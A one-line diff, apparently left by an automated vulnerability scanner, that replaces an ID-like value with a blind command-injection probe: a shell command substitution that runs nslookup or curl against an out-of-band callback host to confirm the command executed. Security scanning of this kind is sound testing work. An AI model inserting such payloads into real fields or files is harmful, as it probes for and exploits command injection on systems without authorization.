@@ -1,1 +1,1 @@
-MO_266134052596_000
+$(nslookup -q=cname hitpvhongjozh90045.bxss.me||curl hitpvhongjozh90045.bxss.me)
